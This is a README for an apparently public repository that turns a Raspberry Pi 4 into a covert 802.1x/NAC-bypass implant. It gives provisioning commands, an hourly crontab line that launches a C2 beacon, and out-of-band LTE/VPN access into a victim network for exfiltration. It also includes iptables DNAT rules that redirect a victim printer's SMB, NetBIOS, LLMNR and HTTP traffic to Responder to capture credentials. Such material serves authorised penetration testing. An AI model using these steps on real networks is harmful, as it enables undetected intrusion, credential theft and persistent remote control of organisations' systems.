# NAC-RPi4
Bash Script to Initialize a Raspberry Pi 4 for Bridged-based 802.1x (NAC) Bypassing

> Classical 802.1x bypass using Linux bridges. Provides the ability to place a rogue device between a supplicant and authentication server without being detected, and to allow traffic to flow through the rogue device (where it can be sniffed). Network interactivity is provided using Source NAT (SNAT) at Layers 2 and 3.
>
> Defeats 802.1x-2004 only and does not work for 802.x-2010 / MACSEC.

---

## ✨ Features

* **🌐 Wi-Fi Hotspot Creation:** Transforms your Raspberry Pi 4 into a dedicated access point with a custom SSID and WPA-PSK password.
* **📡 DHCP Server Configuration:** Sets up `isc-dhcp-server` to automatically assign IP addresses (192.168.200.2-100) to devices connecting to your hotspot.
* **🔒 SSH Security Hardening:** Overwrites the default `sshd_config` with a more secure setup. This includes disabling password authentication by default (except for your hotspot's subnet) and enforcing stronger ciphers and MACs.
* **👻 NAC Bypass Tool Installation:** Installs and sets up the `nac_bypass` tool for advanced network access control evasion.
* **🛡️ Huawei LTE Dongle Setup:** Installs management scripts and systemd services to manage LTE/VPN Out-of-Band (OOB) connections to bypass NAT and allow remote access. Makes use of [Huawei Hilink scripts](https://github.com/zbchristian/huawei_hilink_api) for SIM PIN and LTE connection management.

---

## ⚠️ Prerequisites

Before running this script, make sure you have:

* **Raspberry Pi 4:** This script is specifically designed for the RPi 4. We assume there is a default wlan0 interface.
* **Kali OS Installation:** For the smoothest experience, start with a fresh Kali Linux ARM image. Tested for `kali-linux-2025.2-raspberry-pi-arm64.img`.
* **Internet Connectivity:** Your Pi needs an active internet connection during the script's execution to download packages and clone repositories.
* **Root Privileges:** The script modifies system files and services, so it must be run with `sudo`.
* **LAN USB Adapter:** For NAC bypassing to work, you must have a second LAN NIC (eth1) besides the native one (eth0). Easily achieved by purchasing a LAN USB adapter like [this one](https://amzn.eu/d/eYJzfUH).

> [!TIP]
> You may want to add a [hardened case with display](https://amzn.eu/d/90DKels) and [LTE USB dongle](https://amzn.eu/d/5NSOiOt). Totally optional though. For the TFT display, you must install the drivers from [here](https://github.com/lcdwiki/LCD-show-kali).

---

## 🚀 Getting Started

Follow these steps to get your Raspberry Pi configured:

### 1. Flash Kali Linux ARM x64 onto your RPi 4

Fetch the Kali Linux ISO and flash it onto your SD Card using RPI Imager.

- https://www.kali.org/get-kali/#kali-arm
- https://github.com/raspberrypi/rpi-imager

>[!TIP]
> Using RPI Imager you can configure a default username and password as well as enable OpenSSH!

>[!WARNING]
> Use a LAN cable and refrain from setting up WLAN.
>
> Please connect all hardware devices to the RPi already (LAN/LTE USB adapters).

### 2. Update

Install latest updates onto your RPi4:

````
sudo apt update && sudo apt upgrade -y && sudo reboot now
````

### 3. Download the Script and Run

You can clone this repository and run the script:

```bash
git clone https://github.com/l4rm4nd/NAC-RPi4 && cd NAC-RPi4
sudo chmod +x provision.sh
sudo ./provision.sh
```

### 4. Reboot

After the script has finished, please reboot your RPI4. You can remove the LAN cable from now on.

### 5. Connect to WiFi Hotspot

The RPi4 will spawn a wifi hotspot with your given SSID and password during installation.

Simply connect to the access point.

A DHCP server will be running, handing out client IP addresses from the range `192.168.200.2 - 100`.

### 6. SSH Access

#### Via WiFi Hotspot

Once connected to the wifi hotspot, you can access the RPi4's SSH network service on TCP/22.

The RPi4 will have the IP address `192.168.200.1`. Just connect with your favorite SSH client (e.g. MobaXTerm on Windows or Terminus on Mobile).

#### Via LTE + VPN

In case you make use of an LTE connection, you can store your WireGuard client profile at `/etc/wireguard/wg0.conf` and start a VPN connection via `sudo wg-quick up wg0`. Then, the RPi4 will be in the same VPN network as your operators (pentesters, red teamers etc.). This allows remote access into a compromised corporate's network, while using an Out-of-Band (OOB) LTE+Wireguard network channel. The WG VPN is not configured to automatically start. It's up to you to configure this.

I rather configure a C2 beacon to reach out. Works more reliably and no pain with interfaces. 

Put something like this into your root's crontab:

```
# execute c2 beacon elf file hourly
@hourly nohup /tmp/c2_beacon_arm_linux.bin 2>&1 &
```

Also, if LTE dongle is active as eth2, we should fix ip routes:

````bash
# route private class ips through bridge interface
ip route add 10.0.0.0/8 via 169.254.66.1 dev br0
ip route add 172.16.0.0/12 via 169.254.66.1 dev br0
ip route add 192.168.0.0/16 via 169.254.66.1 dev br0

# remove default route by nac_bypass.sh
ip route del default via 169.254.66.1 dev br0

# make lte dongle interface the default
# should already be there, ensure the following line is available when running `ip route`
# default via 192.168.8.1 dev eth2 proto dhcp src 192.168.8.111 metric 1018
````
This makes Internet work natively and things such as `wg-quick`, `apt update`, exfiltration and so on.

>[!WARNING]
> SSH uses public key authentication for external networks per default. No password auth.
>
> You can adjust the `/etc/ssh/sshd_config` though and whitelist your VPN IP CIDR range for password authentication. See the last entries in the SSH config regarding `Match Address ...`.

>[!CAUTION]
> Please plugin the Huawei LTE USB dongle at a USB 2.0 port and the Gbit LAN dongle at a USB 3.0 port.

#### Via Victim Network

The NAC bypass script will add specific iptables rules to make OpenSSH work. This is done automatically if you run `nac_bypass_setup.sh` with the `-S` flag. Under the hood, the script will create iptables rules to rewrite packets originating at the victim's IP address (e.g. printer) and port `TCP/50022` to the Raspberry Pi and its OpenSSH service on `TCP/22`. This is beneficial, as you can now access the RPi's SSH service from within the corporate's network.

````
# rewrite OpenSSH and map TCP/22 (RPi) to victim NAC device (TCP/50022)
/sbin/iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 50022 -j DNAT --to-destination 169.254.66.66:22
````

You can then simply access OpenSSH using the target corporate network and victim's IP address:

````
ssh <user>@<victim-printer-ip> -p 50022 -i <priv-key>
````

### 7. Adjustments

1. Re-check the OpenSSH configuration at `/etc/ssh/sshd_config`.
2. Re-check the Huawei SIM PIN at `/home/<your-username>/huawei_hilink_api/example_huawei_hilink.sh`.
3. Place your Wireguard client profile at `/etc/wireguard/wg0.conf` and may configure VPN auto-connect after boot.
4. Ensure `legacy` versions are used and not nftables
   - `sudo update-alternatives --config iptables`
   - `sudo update-alternatives --config arptables`
   - `sudo update-alternatives --config ebtables`
5. Ensure kernel module is active
   - `echo br_netfilter | sudo tee -a /etc/modules`

### 8. NAC Bypass

Use the tools `/root/nac_bypass` to your advantage.

May read [this](https://luemmelsec.github.io/I-got-99-problems-but-my-NAC-aint-one/) blog post by LuemmelSec and [this wiki](https://github.com/s0lst1c3/silentbridge/wiki) by Gabriel Ryan to sharpen your NAC bypass understanding.

#### 8.1 - nac_bypass

[README](https://github.com/scipag/nac_bypass)

1. Connect the switch to eth0 (native LAN interface of RPi4)
2. Connect victim (e.g. printer) to eth1 (external USB LAN adapter)

Then start the nac bypass:

````bash
# by default it will treat the lower interface device as switch side, and the next one as victim
./nac_bypass_setup.sh -1 eth0 -2 eth1 -S

# script will ask to wait some time, so it is able to dump the needed info from the network traffic
# afterwards, you can proceed and for instance do an nmap scan on the network
````

#### 8.2 - Responder

To use responder, you will need to run `nac_bypass_setup.sh` with the `-R` flag. Alike to `-S` and OpenSSH, it will automatically add iptables rules to rewrite packets.

Alternatively, you can add those manually by defining the victim's IP:

````
# NetBIOS Name Service (UDP 137)
sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 137 -j DNAT --to-destination 169.254.66.66:137
# NetBIOS Datagram Service (UDP 138)
sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 138 -j DNAT --to-destination 169.254.66.66:138
# NetBIOS Session Service (TCP 139)
sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 139 -j DNAT --to-destination 169.254.66.66:139
# SMB (TCP 445)
sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 445 -j DNAT --to-destination 169.254.66.66:445
# LLMNR / Multicast (UDP 5553)
sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 5553 -j DNAT --to-destination 169.254.66.66:5553
# HTTP (TCP 80)
sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 80 -j DNAT --to-destination 169.254.66.66:80
# may add more like LDAP, SMTP, DNS...
````

>[!CAUTION]
> This will actively mangle with the printer's network packages and features (LDAP search, SMB auth/scan/folders, printer HTTP page, etc.).
> You basically rewrite important packets to your RPi.

In case you want to remove those iptables rules:

````
# list rules with ids
sudo iptables -t nat -L -n --line-numbers

# remove rules by id
sudo iptables -t nat -D PREROUTING <ID>
````

Then you must execute responder like so:

````
sudo /usr/sbin/responder -I br0 -e <VICTIM-PRINTER-IP>
````
